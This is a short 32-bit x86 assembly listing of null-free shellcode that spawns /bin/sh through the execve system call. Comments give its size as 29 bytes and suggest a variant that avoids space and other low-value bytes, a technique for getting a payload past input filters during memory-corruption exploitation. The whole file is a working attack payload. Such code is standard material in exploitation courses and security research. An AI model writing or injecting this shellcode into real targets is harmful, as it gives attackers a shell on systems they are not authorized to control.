; execve("/bin//sh", ["sh"], [NULL]), null-free, 29 bytes
BITS 32
xor eax, eax        ; useful zeros
push eax            ; null termination
push 0x68732f2f     ; "//sh"
mov ecx, esp
inc ecx
inc ecx             ; ecx -> "sh"
push 0x6e69622f     ; "/bin"
mov ebx, esp        ; path -> "/bin/sh"
push eax
mov edx, esp        ; envp -> [NULL]
push ecx
mov ecx, esp        ; argv -> ["sh", NULL]

mov al, 11          ; __NR_execve
; Adjust the preceding line to avoid space chars.
; "mov al, 0x85; rol al, 1" works well (also avoids any char <= 0x20)

int 0x80            ; syscall
